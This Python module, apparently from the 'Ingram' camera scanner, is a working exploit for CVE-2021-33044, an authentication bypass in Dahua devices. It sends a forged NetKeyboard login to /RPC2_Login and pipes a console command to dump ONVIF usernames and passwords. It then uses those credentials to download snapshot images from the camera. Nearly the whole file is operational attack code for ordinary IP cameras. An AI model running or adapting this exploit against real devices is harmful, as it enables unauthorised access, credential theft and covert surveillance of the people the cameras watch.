import requests
from requests.auth import HTTPDigestAuth

from loguru import logger

from .base import POCTemplate
from Ingram.utils import common


def dh_console(ip, port, proto='dhip'):
    console = 'Ingram/lib/DahuaConsole/Console.py'
    user, passwd = '', ''
    try:
        cmd = f"""(
            echo "OnvifUser -u"
            echo "quit all"
        ) | python -Bu {console} --logon netkeyboard --rhost {ip} --rport {port} --proto {proto} 2>/dev/null
        """
        code, msg = common.run_cmd(cmd)
        if code == 0:
            items = msg.split('\n')
            logger.debug(items)
            for idx, val in enumerate(items):
                if 'Name' in val:
                    user = val.split(':')[-1].strip().strip(',').replace('"', '') 
                    passwd = items[idx + 1].split(':')[-1].strip().strip(',').replace('"', '')
                    break
    except Exception as e:
        logger.error(e)
    return user, passwd


class CVE_2021_33044(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['dahua']
        self.product_version = ''
        self.ref = """
        https://www.dahuasecurity.com/support/cybersecurity/details/957
        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33044
        """
        self.level = POCTemplate.level.high
        self.desc = """
        The identity authentication bypass vulnerability found in some Dahua products
        during the login process. Attackers can bypass device identity authentication
        by constructing malicious data packets.
        """

    def verify(self, ip, port=80):
        headers = {
            'User-Agent': self.config.user_agent,
            'Host': ip,
            'Origin': 'http://' + ip,
            'Referer': 'http://' + ip,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection': 'close',
            'X-Requested-With': 'XMLHttpRequest',
        }
        _json = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "password": "Not Used",
                "clientType": "NetKeyboard",
                "loginType": "Direct",
                "authorityType": "Default",
                "passwordType": "Default",
            },
            "id": 1,
            "session": 0,
        }
        url = f"http://{ip}:{port}/RPC2_Login"
        try:
            r = requests.post(url, headers=headers, json=_json, verify=False, timeout=self.config.timeout)
            if r.status_code == 200 and r.json()['result'] == True:
                # firstly, try the dhip
                user, password = dh_console(ip, port, proto='dhip')
                # if not successed, try the http
                if not user and not password:
                    user, password = dh_console(ip, port, proto='http')
                return ip, str(port), self.product, str(user), str(password), self.name
        except Exception as e:
            logger.error(e)
        return None


    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
        return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))


POCTemplate.register_poc(CVE_2021_33044)